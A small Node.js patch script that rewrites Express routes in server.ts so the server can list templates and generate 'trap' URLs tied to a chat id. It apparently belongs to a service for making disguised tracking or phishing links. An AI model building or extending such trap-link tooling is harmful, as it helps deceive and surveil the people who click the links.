const fs = require('fs');
let code = fs.readFileSync('server.ts', 'utf-8');
const replacement = `app.get('/api/templates', (req, res) => { res.json(Object.entries(templates).map(([key, val]) => ({ id: key, name: val.name }))); });
  app.post('/api/create-trap', (req, res) => {
    const { tmplId, redirect } = req.body;
    let chatId = ADMIN_ID;
    if (req.body.chatId) {
        chatId = req.body.chatId;
    }
    const id = generateTrapId(chatId);
    const trapUrl = \`\${appHost.replace(/\\/$/, '')}/t/\${tmplId}/\${id}\`;
    res.json({ success: true, url: trapUrl });
  });`;
code = code.replace(/app\.get\('\/api\/templates'.*?\n.*?app\.post\('\/api\/create-trap'.*?\n.*?\n.*?\n.*?\n.*?\}\);/g, replacement);
fs.writeFileSync('server.ts', code);
